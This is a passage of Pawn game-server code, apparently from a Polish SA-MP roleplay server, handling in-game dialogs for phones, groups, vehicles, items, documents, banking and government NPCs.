					SendClientMessage(callerid, 0xA17E4FFF, msg);
					Streamer_Update(callerid);
				}
				new group_uid = AppCache[app_id][appOwner];
				for(new i; i<=GetPlayerPoolSize(); i++)
				{
					if(IsPlayerConnected(i))
					{
						if(PlayerCache[i][pGroup] == group_uid || PlayerCache[i][pGroup2] == group_uid || PlayerCache[i][pGroup3] == group_uid)
						{
							new msg[64]; format(msg, sizeof(msg), "~w~%s odbiera~n~~y~%d", RPName(playerid), app_id);
							GameTextForPlayer(i, msg, 3000, 4);
						}
					}
				}
				AppCache[app_id][appState] = 1;
				new call_vw = AppCache[app_id][appVW];
				new id2;
				if(call_vw != 0)
				{
					for(new i; i<LastdUID; i++)
					{
						if(!DoorCache[i][dDestroyed])
						{
							if(call_vw == DoorCache[i][dInsVW])
							{
								if(!DoorCache[i][dConnect])
								id2 = CreateDynamicMapIcon(DoorCache[i][dOutX], DoorCache[i][dOutY], DoorCache[i][dOutZ], 0, COLOR_DARKRED, 0, 0, playerid, 60000, MAPICON_GLOBAL_CHECKPOINT);
							}
						}
					}
				}
				else
				id2 = CreateDynamicMapIcon(AppCache[app_id][appX], AppCache[app_id][appY], AppCache[app_id][appZ], 0, COLOR_DARKRED, 0, 0, playerid, 60000, MAPICON_GLOBAL_CHECKPOINT);
				Streamer_Update(playerid);
				SendClientMessage(playerid, 0xA17E4FFF, "> Odebrano zg³oszenie. Miejsce zg³oszenia zosta³o oznaczone na radarze.");
				SetTimerEx("DestroyIconZ", 60000*10, false, "i", id2);
				new str[256]; format(str, sizeof(str), "~y~Nr zadania: %d~n~Zadajacy: %s~n~~n~~w~%s", app_id, PlayerCache[AppCache[app_id][appPlayerUID]][pName], AppCache[app_id][appText]);
				PlayerTextDrawSetString(playerid,ObjectInfo[playerid], str);
				PlayerTextDrawShow(playerid, ObjectInfo[playerid]);
			}*/
		}
		case D_APP:
		{
			if(response)
			{
				/*if(Isnull(inputtext))
				return ShowDialogApp(playerid);
				new p_phone = pVal[playerid];
				new group_uid = pVal2[playerid];
				new msg[256];
				new msg2[256];
				format(msg, sizeof(msg), "%s (telefon): %s", RPName(playerid), inputtext);
				SendPlayerMessageInRange(playerid, msg, CHAT_SHADE_1, CHAT_SHADE_2, CHAT_SHADE_3, CHAT_SHADE_4, CHAT_SHADE_5, CHAT_SHADE_6, false);
				format(msg, sizeof(msg), "** Zg³oszenie od: %d ** (( %s ))", p_phone+50000, RPName(playerid));
				format(msg2, sizeof(msg2), "** Treœæ: %s **", inputtext);
				for(new i; i<=GetPlayerPoolSize(); i++)
				{
					if(IsPlayerConnected(i))
					{
						if(PlayerCache[i][pGroup] == group_uid || PlayerCache[i][pGroup2] == group_uid || PlayerCache[i][pGroup3] == group_uid)
						{
							SendClientMessage(i, 0xAB8859FF, msg); SendClientMessage(i, 0xAB8859FF, msg2);
						}
					}
				}
				new free_slot;
				for(new i; i<MAX_APPS; i++)
				{
					if(!AppCache[i][appID])
					{
						free_slot = i;
						break;
					}
				}
				AppCache[free_slot][appPhone] = pVal[playerid];
				AppCache[free_slot][appID] = free_slot;
				AppCache[free_slot][appOwner] = group_uid;
				GetPlayerPos(playerid, AppCache[free_slot][appX], AppCache[free_slot][appY], AppCache[free_slot][appZ]);
				AppCache[free_slot][appVW] = GetPlayerVirtualWorld(playerid);
				AppCache[free_slot][appState] = 0;
				AppCache[free_slot][appPlayerUID] = PlayerCache[playerid][pUID];
				new str[128]; format(str, sizeof(str), inputtext);
				AppCache[free_slot][appText] = str;
				return SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);*/
			}
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
			return ShowDialogContacts(playerid);
		}
		case D_SETANIM:
		{
			new id = strval(inputtext);
			if(id == -1)
			{
				new str[16]; str = "";
				PlayerCache[playerid][pFavAnim] = str;
				return TextDrawForPlayerEx(playerid, 1, "~r~~h~Animacja na przycisk zostala dezaktywowana.", 3000);
			}
			new str[16]; format(str, sizeof(str), AnimList[id][aCustomName]);
			PlayerCache[playerid][pFavAnim] = str;
			return TextDrawForPlayerEx(playerid, 1, "~g~~h~Animacja zostala ustawiona.~n~~w~Nacisnij LALT by aktywowac animacje.", 3000);
		}
		case D_SIM:
		{
			new uid = strval(inputtext);
			if(ItemCache[uid][iVal])
			return ShowDialogInfo(playerid, "W tym telefonie znajduje siê ju¿ karta SIM.");
			ItemCache[uid][iVal] = pVal[playerid];
			ItemCache[pVal[playerid]][iState] = 4;
			return SendPlayerMe(playerid, "wk³ada kartê SIM do telefonu.");
		}
		case D_OBJECTGROUP:
		{
			if(response)
			{
				if(ObjectCache[playerid][oUID])
				return SendClientMessage(playerid, COLOR_GRAY, "Nie edytujesz ¿adnego obiektu.");
				if(!ObjectCache[playerid][oGate])
				return SendClientMessage(playerid, COLOR_GRAY, "Edytowany obiekt nie jest bram¹.");

				new str[128], guid = strval(inputtext), gname[32];

				format(str, sizeof(str), "SELECT name FROM groups WHERE uid = '%d' LIMIT 1", guid);
				new Cache:cache = mysql_query(DB_HANDLE, str);
				if(cache_num_rows())
				{
					cache_get_value_name(0, "name", gname);

					cache_delete(cache);
				}
				else
				return SendClientMessage(playerid, COLOR_GRAY, "Wybrana grupa zosta³a usuniêta.");


				format(str, sizeof(str), "UPDATE objects SET owner = '%d' WHERE uid = '%d' LIMIT 1", guid, ObjectCache[playerid][oUID]);
				cache_delete(mysql_query(DB_HANDLE, str));

				format(str, sizeof(str), "Obiekt zosta³ pomyœlnie podpisany pod grupê: %s", gname);
				return SendClientMessage(playerid, COLOR_GRAY, str);
			}
		}
		/*case D_MAKEBUS:
		{
			if(response)
			{
				if(Isnull(inputtext))
				return SendClientMessage(playerid, COLOR_GRAY, "Nie wpisano nazwy przystanku. Usuñ go i wprowadŸ nazwê jeszcze raz.");
				new ouid = GetObjectUID(GetPlayerObjectID(playerid));
				new newname[32]; format(newname, sizeof(newname), inputtext);
				ObjectCache[ouid][oName] = newname;
				return ShowDialogInfo(playerid, "Przystanek zosta³ dodany pomyœlnie.");
			}
		}*/
		case D_BUS:
		{
			if(response)
			{
				new ouid = strval(inputtext);
				pVal[playerid] = ouid;
				TogglePlayerControllable(playerid, 0);
				SetPlayerCameraPos(playerid, ObjectCache[ouid][oX], ObjectCache[ouid][oY], ObjectCache[ouid][oZ]+300);
				SetPlayerCameraLookAt(playerid, ObjectCache[ouid][oX], ObjectCache[ouid][oY], ObjectCache[ouid][oZ], CAMERA_MOVE);
				BusTimer[playerid] = SetTimerEx("Bus", 120, true, "ii", playerid, ouid);
				PlayerTextDrawSetString(playerid, RadarTextDraw[playerid], "~g~~h~Enter ~w~by wybrac przystanek~n~~r~~h~Shift ~w~by anulowac~n~~b~~h~Strzalki lub klawisze ~w~by sie poruszac");
				return PlayerTextDrawShow(playerid, RadarTextDraw[playerid]);
			}
		}
		case D_VEHICLE_GROUP:
		{
			if(response)
			{
				if(!IsPlayerInAnyVehicle(playerid))
					return SendClientMessage(playerid, COLOR_GRAY, "Opuszczono pojazd.");

				if(PlayerCache[playerid][pCurrentVehicle][vGroupUID])
				{
					PlayerCache[playerid][pCurrentVehicle][vGroupUID] = 0;
					new query[256];
					format(query, sizeof(query), "UPDATE vehicles SET groupUID=0 WHERE uid=%d;", PlayerCache[playerid][pCurrentVehicle][vUID]);
					mysql_query(DB_HANDLE, query, false);
					return ShowDialogInfo(playerid, "Pojazd zosta³ odpisany z grupy.");
				}
				
				if(PlayerCache[playerid][pCurrentVehicle][vPlayerUID] != PlayerCache[playerid][pUID])
				return SendClientMessage(playerid, COLOR_GRAY, "Ten pojazd nie jest Twój.");


				new guid = 0;
				sscanf(inputtext, "i", guid);

				new query[256];
				format(query, sizeof(query), "SELECT null FROM vehicles WHERE groupUID=%d", guid);
				new Cache:cache = mysql_query(DB_HANDLE, query);
				if(cache_num_rows()==20){
					cache_delete(cache);
					return TextDrawForPlayerEx(playerid, 2, "Grupa osiagnela limit pojazdow.", 5000);
				}

				
				PlayerCache[playerid][pCurrentVehicle][vGroupUID] = guid;

				format(query, sizeof(query), "UPDATE vehicles SET groupUID = %d WHERE vehicleUID = %d LIMIT 1", guid, PlayerCache[playerid][pCurrentVehicle][vGroupUID]);

				new str[128]; format(str, sizeof(str), "Pojazd nale¿y teraz do grupy: %s (UID: %d)\nJeœli jednak zmienisz zdanie, mo¿esz go swobodnie odpisaæ.", GroupCache[guid][gName], guid);
				return ShowDialogInfo(playerid, str);
			}
		}
		case D_ANIMS:
		{
			if(response)
			{
				new string[64]; format(string, sizeof(string), inputtext);
				strdel(string, 0, 2);
				for(new i=0; i<MAX_ANIMS; i++)
				{
					if(!strcmp(string, AnimList[i][aCustomName], true))
					{
						return ApplyAnimation(playerid, AnimList[i][aLib], AnimList[i][aName], 4.1, AnimList[i][aRepeat], AnimList[i][aLockX], AnimList[i][aLockY], AnimList[i][aFreeze], AnimList[i][aTime], 0);
					}
				}
			}
		}
		case D_GROUP_MEMBER_PERMS:
		{
			if(response)
			{
				/*new guid = pVal[playerid];
				new muid = pVal2[playerid];
				if(PlayerCache[muid][pGroup] == guid)             // GROUP 1
				{
					if(!strcmp(inputtext, "+A", true))
					{
						if(!PlayerCache[muid][pGroupAdmin])
						PlayerCache[muid][pGroupAdmin] = true;
					}
					else if(!strcmp(inputtext, "-A", true))
					{
						if(PlayerCache[muid][pGroupAdmin])
						PlayerCache[muid][pGroupAdmin] = false;
					}
					else if(!strcmp(inputtext, "+B", true))
					{
						if(!PlayerCache[muid][pGroupMapper])
						PlayerCache[muid][pGroupMapper] = true;
					}
					else if(!strcmp(inputtext, "-B", true))
					{
						if(PlayerCache[muid][pGroupMapper])
						PlayerCache[muid][pGroupMapper] = false;
					}
					else if(!strcmp(inputtext, "+C", true))
					{
						if(!PlayerCache[muid][pGroupInvite])
						PlayerCache[muid][pGroupInvite] = true;
					}
					else if(!strcmp(inputtext, "-C", true))
					{
						if(PlayerCache[muid][pGroupInvite])
						PlayerCache[muid][pGroupInvite] = false;
					}
					else if(!strcmp(inputtext, "+D", true))
					{
						if(!PlayerCache[muid][pGroupDoor])
						PlayerCache[muid][pGroupDoor] = true;
					}
					else if(!strcmp(inputtext, "-D", true))
					{
						if(PlayerCache[muid][pGroupDoor])
						PlayerCache[muid][pGroupDoor] = false;
					}
					else if(!strcmp(inputtext, "+E", true))
					{
						if(!PlayerCache[muid][pGroupVehicle])
						PlayerCache[muid][pGroupVehicle] = true;
					}
					else if(!strcmp(inputtext, "-E", true))
					{
						if(PlayerCache[muid][pGroupVehicle])
						PlayerCache[muid][pGroupVehicle] = false;
					}
					else if(!strcmp(inputtext, "+F", true))
					{
						if(!PlayerCache[muid][pGroupProducts])
						PlayerCache[muid][pGroupProducts] = true;
					}
					else if(!strcmp(inputtext, "-F", true))
					{
						if(PlayerCache[muid][pGroupProducts])
						PlayerCache[muid][pGroupProducts] = false;
					}
				}
				else if(PlayerCache[muid][pGroup2] == guid)                  // GROUP 2
				{
					if(!strcmp(inputtext, "+A", true))
					{
						if(!PlayerCache[muid][pGroupAdmin2])
						PlayerCache[muid][pGroupAdmin2] = true;
					}
					else if(!strcmp(inputtext, "-A", true))
					{
						if(PlayerCache[muid][pGroupAdmin2])
						PlayerCache[muid][pGroupAdmin2] = false;
					}
					else if(!strcmp(inputtext, "+B", true))
					{
						if(!PlayerCache[muid][pGroupMapper2])
						PlayerCache[muid][pGroupMapper2] = true;
					}
					else if(!strcmp(inputtext, "-B", true))
					{
						if(PlayerCache[muid][pGroupMapper2])
						PlayerCache[muid][pGroupMapper2] = false;
					}
					else if(!strcmp(inputtext, "+C", true))
					{
						if(!PlayerCache[muid][pGroupInvite2])
						PlayerCache[muid][pGroupInvite2] = true;
					}
					else if(!strcmp(inputtext, "-C", true))
					{
						if(PlayerCache[muid][pGroupInvite2])
						PlayerCache[muid][pGroupInvite2] = false;
					}
					else if(!strcmp(inputtext, "+D", true))
					{
						if(!PlayerCache[muid][pGroupDoor2])
						PlayerCache[muid][pGroupDoor2] = true;
					}
					else if(!strcmp(inputtext, "-D", true))
					{
						if(PlayerCache[muid][pGroupDoor2])
						PlayerCache[muid][pGroupDoor2] = false;
					}
					else if(!strcmp(inputtext, "+E", true))
					{
						if(!PlayerCache[muid][pGroupVehicle2])
						PlayerCache[muid][pGroupVehicle2] = true;
					}
					else if(!strcmp(inputtext, "-E", true))
					{
						if(PlayerCache[muid][pGroupVehicle2])
						PlayerCache[muid][pGroupVehicle2] = false;
					}
					else if(!strcmp(inputtext, "+F", true))
					{
						if(!PlayerCache[muid][pGroupProducts2])
						PlayerCache[muid][pGroupProducts2] = true;
					}
					else if(!strcmp(inputtext, "-F", true))
					{
						if(PlayerCache[muid][pGroupProducts2])
						PlayerCache[muid][pGroupProducts2] = false;
					}
				}
				else if(PlayerCache[muid][pGroup3] == guid)                  // GROUP 3
				{
					if(!strcmp(inputtext, "+A", true))
					{
						if(!PlayerCache[muid][pGroupAdmin3])
						PlayerCache[muid][pGroupAdmin3] = true;
					}
					else if(!strcmp(inputtext, "-A", true))
					{
						if(PlayerCache[muid][pGroupAdmin3])
						PlayerCache[muid][pGroupAdmin3] = false;
					}
					else if(!strcmp(inputtext, "+B", true))
					{
						if(!PlayerCache[muid][pGroupMapper3])
						PlayerCache[muid][pGroupMapper3] = true;
					}
					else if(!strcmp(inputtext, "-B", true))
					{
						if(PlayerCache[muid][pGroupMapper3])
						PlayerCache[muid][pGroupMapper3] = false;
					}
					else if(!strcmp(inputtext, "+C", true))
					{
						if(!PlayerCache[muid][pGroupInvite3])
						PlayerCache[muid][pGroupInvite3] = true;
					}
					else if(!strcmp(inputtext, "-C", true))
					{
						if(PlayerCache[muid][pGroupInvite3])
						PlayerCache[muid][pGroupInvite3] = false;
					}
					else if(!strcmp(inputtext, "+D", true))
					{
						if(!PlayerCache[muid][pGroupDoor3])
						PlayerCache[muid][pGroupDoor3] = true;
					}
					else if(!strcmp(inputtext, "-D", true))
					{
						if(PlayerCache[muid][pGroupDoor3])
						PlayerCache[muid][pGroupDoor3] = false;
					}
					else if(!strcmp(inputtext, "+E", true))
					{
						if(!PlayerCache[muid][pGroupVehicle3])
						PlayerCache[muid][pGroupVehicle3] = true;
					}
					else if(!strcmp(inputtext, "-E", true))
					{
						if(PlayerCache[muid][pGroupVehicle3])
						PlayerCache[muid][pGroupVehicle3] = false;
					}
					else if(!strcmp(inputtext, "+F", true))
					{
						if(!PlayerCache[muid][pGroupProducts3])
						PlayerCache[muid][pGroupProducts3] = true;
					}
					else if(!strcmp(inputtext, "-F", true))
					{
						if(PlayerCache[muid][pGroupProducts3])
						PlayerCache[muid][pGroupProducts3] = false;
					}
				}*/
				return ShowDialogMemberPerms(playerid);
			}
			PlayerTextDrawHide(playerid, ObjectInfo[playerid]);
			return ShowDialogGroupMembers(playerid);
		}
		case D_MANAGE_MEMBER:
		{
			if(response)
			{
				/*new option = strval(inputtext);
				new guid = pVal[playerid];
				new muid = pVal2[playerid];
				switch(option)
				{
					case 1:
					{
						if(PlayerCache[muid][pGroup] == guid)
						{
							PlayerCache[muid][pGroup] = 0;
							new msg[128]; format(msg, sizeof(msg), "Wydalono Ciê z grupy %s.", GroupCache[guid][gName]);
							for(new i; i<=GetPlayerPoolSize(); i++)
							{
								if(IsPlayerConnected(i))
								{
									if(PlayerCache[i][pUID] == muid)
									{
										SendClientMessage(i, COLOR_GRAY, msg);
										UpdatePlayerName(i);
										UpdatePlayerInfo(i);
									}
								}
							}
							format(msg, sizeof(msg),  "Wyrzucono %s z grupy.", strreplace(PlayerCache[muid][pName], '_', ' '));
							SendClientMessage(playerid, COLOR_GRAY, msg);
						}
						else if(PlayerCache[muid][pGroup2] == guid)
						{
							PlayerCache[muid][pGroup2] = 0;
							new msg[128]; format(msg, sizeof(msg), "Wydalono Ciê z grupy %s.", GroupCache[guid][gName]);
							for(new i; i<=GetPlayerPoolSize(); i++)
							{
								if(IsPlayerConnected(i))
								{
									if(PlayerCache[i][pUID] == muid)
									{
										SendClientMessage(i, COLOR_GRAY, msg);
										UpdatePlayerName(i);
										UpdatePlayerInfo(i);
									}
								}
							}
							format(msg, sizeof(msg),  "Wyrzucono %s z grupy.", strreplace(PlayerCache[muid][pName], '_', ' '));
							SendClientMessage(playerid, COLOR_GRAY, msg);
						}
						else if(PlayerCache[muid][pGroup3] == guid)
						{
							PlayerCache[muid][pGroup3] = 0;
							new msg[128]; format(msg, sizeof(msg), "Wydalono Ciê z grupy %s.", GroupCache[guid][gName]);
							for(new i; i<=GetPlayerPoolSize(); i++)
							{
								if(IsPlayerConnected(i))
								{
									if(PlayerCache[i][pUID] == muid)
									{
										SendClientMessage(i, COLOR_GRAY, msg);
										UpdatePlayerName(i);
										UpdatePlayerInfo(i);
									}
								}
							}
							format(msg, sizeof(msg),  "Wyrzucono %s z grupy.", strreplace(PlayerCache[muid][pName], '_', ' '));
							SendClientMessage(playerid, COLOR_GRAY, msg);
						}
						else
						{
							SendClientMessage(playerid, COLOR_GRAY, "Ten gracz nie nale¿y ju¿ do tej grupy.");
						}
						return ShowDialogGroupMembers(playerid);
					}
					case 2: return ShowDialogMemberPerms(playerid);
					case 3: return ShowDialogMemberPayDay(playerid);
				}*/
			}
			return ShowDialogGroupMembers(playerid);
		}
		case D_GROUP_OPTIONS:
		{
			if(response)
			{
				new option=strval(inputtext);
				new guid = pVal[playerid];
				switch(option)
				{
					case 1: return ShowDialogChangeGroupColor(playerid);
					case 2:
					{
						if(GroupCache[guid][gChatOOC])
						{
							GroupCache[guid][gChatOOC] = false;
							TextDrawForPlayerEx(playerid, 1, "~r~~h~Czat grupowy OOC przelaczony.", 3000);
						}
						else
						{
							GroupCache[guid][gChatOOC] = true;
							TextDrawForPlayerEx(playerid, 1, "~g~~h~Czat grupowy OOC przelaczony.", 3000);
						}
					}
					case 3:
					{
						if(GroupCache[guid][gChatIC])
						{
							GroupCache[guid][gChatIC] = false;
							TextDrawForPlayerEx(playerid, 1, "~r~~h~Sluchawka grupy przelaczona.", 3000);
						}
						else
						{
							GroupCache[guid][gChatIC] = true;
							TextDrawForPlayerEx(playerid, 1, "~g~~h~Sluchawka grupy przelaczona.", 3000);
						}
					}
					case 4: return ShowDialogGroupPayDay(playerid);
				}
				return ShowDialogGroupOptions(playerid, guid);
			}
			return 1;
		}
		case D_ALLGROUPS:
		{
			if(response)
			{
				new list[525] = "UID\tNazwa grupy\tStan konta\tRodzaj\n", info[256], count;
				if(!strcmp(inputtext, "Dalej", false))
				{
					if(pPage[playerid]==0)
					pPage[playerid]++;
					pPage[playerid]++;
					for(new i=pPage[playerid]; i<LastgUID; i++)
					{
						if(GroupCache[i][gState] == 0)
						{
							if(GroupCache[i][gUID] == 0)
							continue;
							pPage[playerid] = i;
							format(info, sizeof(info), "%d\t%s\t$%d\t%s\n", GroupCache[i][gUID], GroupCache[i][gName], GroupCache[i][gBank], GetGroupType(GroupCache[i][gType]));
							strins(list, info, strlen(list));
							count++;
							if(count == 10 || GroupCache[i+1][gUID] == 0)
							{
								strins(list, "Dalej\nWróæ", strlen(list));
								return ShowPlayerDialog(playerid, D_ALLGROUPS, DIALOG_STYLE_TABLIST_HEADERS, "Grupy", list, "wybierz", "anuluj");
							}
						}	
					}
				}
				else if(!strcmp(inputtext, "Wróæ", false))
				{
					if(pPage[playerid] - 1 > 0)
					{
						pPage[playerid]-=10;
						for(new i=pPage[playerid]; i<LastgUID; i++)
						{
							if(GroupCache[i][gState] == 0)
							{
								if(GroupCache[i][gUID] == 0)
								continue;
								format(info, sizeof(info), "%d\t%s\t$%d\t%s\n", GroupCache[i][gUID], GroupCache[i][gName], GroupCache[i][gBank], GetGroupType(GroupCache[i][gType]));
								strins(list, info, strlen(list));
								count++;
								pPage[playerid]=i;
								if(count == 10 || GroupCache[i-1][gUID] == 0)
								{
									strins(list, "Dalej\nWróæ", strlen(list));
									return ShowPlayerDialog(playerid, D_ALLGROUPS, DIALOG_STYLE_TABLIST_HEADERS, "Grupy", list, "wybierz", "anuluj");
								}
							}	
						}
					}
				}
				if(!count)
				{
					pPage[playerid] = 0;
					return ShowDialogInfo(playerid, "¯adna grupa nie zosta³a stworzona lub lista skoñczy³a siê.");
				}
				return 1;
			}
			else
			return pPage[playerid] = 0;
		}
		case D_MEDIC:
		{
			if(response)
			{
				switch(listitem)
				{
					case 0:
					{
						if(PlayerCache[playerid][pHealth] >= 10)
						return ShowDialogInfo(playerid, "Twój stan zdrowia jest dobry, nie potrzebujesz leku.");
						if(PlayerCache[playerid][pCash] < 50)
						return TextDrawForPlayerEx(playerid, 1, "Nie posiadasz przy sobie tylu pieniedzy.", 3000);
						PlayerCache[playerid][pCash] -= 50;
						GivePlayerMoney(playerid, -50);
						PlayerCache[playerid][pHealth] += 10;
						return SetPlayerHealth(playerid, PlayerCache[playerid][pHealth]);
					}
				}
			}
		}
		case D_BUY_REGISTER:
		{
			if(response)
			{
				if(PlayerCache[playerid][pCash] >= 300)
				{
					PlayerCache[playerid][pCash] -= 300;
					GivePlayerMoney(playerid, -300);
					CreateItem(playerid, 14, 0, 0, 0,0, "Rejestracja pojazdu");
					return ShowDialogInfo(playerid, "Zakupiono nowy przedmiot! Rejestracja pojazdu pojawi³a siê w Twoim ekwipunku.");
				}
				return TextDrawForPlayerEx(playerid, 1, "Nie posiadasz przy sobie az tylu pieniedzy by zakupic ten przedmiot.", 3000);
			}
		}
		case D_BAGS:
		{
			if(response)
			{
				new baguid = ItemCache[strval(inputtext)][iUID];
				new count;
				for(new i; i<MAX_ITEMS; i++)
				{
					if(ItemCache[i][iState] == 4)
					{
						if(ItemCache[i][iOwner] == baguid)
						{
							count++;
						}
					}
				}
				if(count >= 20)
				return ShowDialogInfo(playerid, "W tej torbie nie zmieœci siê a¿ tyle przedmiotów.");
				new choosenuid = pVal[playerid];
				ItemCache[choosenuid][iState] = 4;
				ItemCache[choosenuid][iOwner] = baguid;

				new query[128];

				format(query, sizeof(query), "UPDATE items SET state = '4', owner = '%d' WHERE uid = '%d'", ItemCache[choosenuid][iOwner],
				ItemCache[choosenuid][iUID]);
				mysql_query(DB_HANDLE, query);

				return TextDrawForPlayerEx(playerid, 1, "~b~~h~~h~~h~Schowano przedmiot", 3000);
			}
			return 1;
		}
		case D_BAG:
		{
			if(response)
			{
				new choosenuid = strval(inputtext);
				ItemCache[choosenuid][iOwner] = PlayerCache[playerid][pUID];
				ItemCache[choosenuid][iState] = 0;
				return TextDrawForPlayerEx(playerid, 1, "~b~~h~~h~~h~Wyjeto przedmiot", 3000);
			}
			return 1;
		}
		case D_DOCUMENTS:
		{
			if(response)
			{	
				new docUID;
				sscanf(inputtext, "i", docUID);

				new query[420];
				format(query, sizeof(query), "SELECT playerDocs.type, playerDocs.createdAt, players.bornDate, players.gender, players.name FROM playerDocs INNER JOIN players ON playerDocs.playerUID=players.uid AND playerDocs.uid=%d LIMIT 1;", docUID);
				new Cache:cache = mysql_query(DB_HANDLE, query);
				
				new type, createdAt[32], bornDate[32], gender, name[24];
				cache_get_value_name_int(0, "type", type);
				cache_get_value_name_int(0, "gender", gender);
				cache_get_value_name(0, "createdAt", createdAt);
				cache_get_value_name(0, "name", name);
				cache_get_value_name(0, "bornDate", bornDate);

				cache_delete(cache);

				new info[256];
				switch(type){
					case DOC_TYPE_ID:{
							format(info, sizeof(info), ""HEX_WHITE"Dowód osobisty\n\nImiê i nazwisko: %s\nP³eæ: %s\nData urodzenia: %d", 
							strreplace(name, '_', ' '), 
							gender ? ("Kobieta")  : ("Mê¿czyzna"), 
							bornDate);
					}
					case DOC_TYPE_FISHING_RIGHT:{
							format(info, sizeof(info), ""HEX_WHITE"Licencja na ³owienie ryb\n\nImiê i nazwisko: %s\nP³eæ: %s\nData urodzenia: %d", 
							strreplace(name, '_', ' '), 
							gender ? ("Kobieta")  : ("Mê¿czyzna"), 
							bornDate);
					}
					case DOC_TYPE_INSANITY:{
							format(info, sizeof(info), ""HEX_WHITE"Zaœwiadczenie o niepoczytalnoœci\n\nImiê i nazwisko: %s\nP³eæ: %s\nData urodzenia: %d", 
							strreplace(name, '_', ' '), 
							gender ? ("Kobieta")  : ("Mê¿czyzna"), 
							bornDate);
					}
					case DOC_TYPE_SANITY:{
							format(info, sizeof(info), ""HEX_WHITE"Zaœwiadczenie o poczytalnoœci\n\nImiê i nazwisko: %s\nP³eæ: %s\nData urodzenia: %d", 
							strreplace(name, '_', ' '), 
							gender ? ("Kobieta")  : ("Mê¿czyzna"), 
							bornDate);
					}
					case DOC_TYPE_NO_CRIMINAL_RECORD:{
							format(info, sizeof(info), ""HEX_WHITE"Zaœwiadczenie o niekaralnoœci\n\nImiê i nazwisko: %s\nP³eæ: %s\nData urodzenia: %d", 
							strreplace(name, '_', ' '), 
							gender ? ("Kobieta")  : ("Mê¿czyzna"), 
							bornDate);
					}
					case DOC_TYPE_DRIVING_LICENSE:{
							format(info, sizeof(info), ""HEX_WHITE"Prawo jazdy\n\nImiê i nazwisko: %s\nP³eæ: %s\nData urodzenia: %d", 
							strreplace(name, '_', ' '), 
							gender ? ("Kobieta")  : ("Mê¿czyzna"), 
							bornDate);
					}
				
				}
					
				
				
				ShowDialogInfo(playerid, info);
				
			}
		}
		case D_TRADE_3:
		{
			if(response)
			{
				if(ActionData[playerid][aType] == 2)
				{
					if(PlayerCache[playerid][pCash] < 100)
					return TextDrawForPlayerEx(playerid, 1, "Nie posiadasz przy sobie tyle gotowki.", 5000);
					PlayerCache[playerid][pCash] -=100;
					GivePlayerMoney(playerid, -100);
					PlayerCache[playerid][pID_Card] = true;
					ActionData[playerid][aType] = 0;
					return ShowDialogInfo(playerid, "Super! Zdoby³eœ/aœ dokumenty osobisty postaci.\nMo¿esz skorzystaæ z komendy: /pokaz dowod [ID/Czêœæ nazwy gracza]\nby pokazaæ komuœ swój dokument.");
				}
			}
			return 1;
		}
		case D_GOVERMENT:
		{
			new msg[128];
			new actoruid = GetActorInRange(playerid);
			if(response)
			{
				new option = strval(inputtext);

				switch(option)
				{
					case 1:
					{
						if(PlayerCache[playerid][pID_Card])
						return ShowDialogInfo(playerid, "Posiadasz ju¿ dokument osobisty.");
						ActionData[playerid][aType] = 2;
						return TextDrawForPlayerEx(playerid, 1, "Odegraj przekazanie dokumentu urzednikowi.~n~/me wyjmuje z teczki swoj akt urodzenia i kladzie go na ladzie.", 15000);
					}
					case 3:
					{
						format(msg, sizeof(msg), "%s mówi: Poproszê o Pañski dowód osobisty oraz dowód przynale¿noœci pojazdu.", strreplace(ActorCache[actoruid][aName], '_', ' '));
						SendClientMessage(playerid, COLOR_GRAY, msg);
						pVal[playerid] = 1;
						pVal2[playerid] = actoruid;
						PlayerTextDrawSetString(playerid, RadarTextDraw[playerid], "Odegraj przekazanie urzednikowi wymaganych dokumentow~n~za pomoca komendy /me.");
						return PlayerTextDrawShow(playerid, RadarTextDraw[playerid]);
					}
					default: ShowDialogInfo(playerid, "Ta funkcja nie jest jeszcze dostêpna.");

				}
			}
			else
			{
				format(msg, sizeof(msg), "%s mówi: Do widzenia!", strreplace(ActorCache[actoruid][aName], '_', ' '));
				return SendClientMessage(playerid, COLOR_GRAY, msg);
			}
		}
		case D_BANK:
		{
			new auid = GetActorInRange(playerid);
			new msg[128];
			if(response)
			{
				new option = strval(inputtext);
				switch(option)
				{
					case 1:
					{
						if(PlayerCache[playerid][pBankAccount])
						{
							format(msg, sizeof(msg), "%s mówi: Konto bankowe jest ju¿ zarejestrowane w systemie.", strreplace(ActorCache[auid][aName], '_', ' '));
							ShowDialogInfo(playerid, "Posiadasz ju¿ konto bankowe.");
						}
						else if(!PlayerCache[playerid][pID_Card])
						{
							format(msg, sizeof(msg), "%s mówi: Aby otworzyæ konto w naszym banku, potrzebny jest dowód osobisty.",strreplace(ActorCache[auid][aName], '_', ' '));
							ShowDialogInfo(playerid, "Aby otworzyæ konto bankowe musisz mieæ wyrobiony dokument osobisty postaci.\nUdaj siê do urzêdu.");
						}
						else
						{
							format(msg, sizeof(msg), "%s mówi: Proszê podaæ swój dowód osobisty.", strreplace(ActorCache[auid][aName], '_', ' '));
							ActionData[playerid][aType] = 1;
							return TextDrawForPlayerEx(playerid, 1, "Odegraj przekazanie dokumentu urzednikowi.~n~/me wyjmuje z teczki swoj dowod osobisty i kladzie go na lade.", 15000);
						}
						return SendClientMessage(playerid, CHAT_SHADE_2, msg);
					}
					default: return ShowDialogInfo(playerid, "Ta funkcja bêdzie dostêpna ju¿ wkrótce!");
				}
			}
			format(msg, sizeof(msg), "%s mówi: Do widzenia!", strreplace(ActorCache[auid][aName], '_', ' '));
			return	SendClientMessage(playerid, CHAT_SHADE_2, msg);
		}
		case D_AMMO:
		{
			if(response)
			{
				new lastuid = pVal[playerid];
				if(ItemCache[lastuid][iActive])
				return GameTextForPlayer(playerid, "~b~~h~~h~~h~schowaj przedmiot!", 3000, 4);
				new choosenuid = strval(inputtext), ammotoload = ItemCache[lastuid][iVal2];
				ItemCache[choosenuid][iVal2] += ammotoload;
				ItemCache[lastuid][iState] = 3;
				SendPlayerMe(playerid, "uzupe³nia amunicjê do swojej broni.");
				return ApplyAnimation(playerid, "buddy", "buddy_reload ", 4.1, 0, 0, 0, 0, 0, 0);
			}
			return 1;
		}
		case D_V_OPTIONS:
		{
			new option = 0;
			sscanf(inputtext, "i", option);
			new vehicleId = GetPlayerVehicleID(playerid);
			if(response)
			{
				switch(option)
				{
					case 1:
					{
						if( PlayerCache[playerid][pCurrentVehicle][vBonnet])
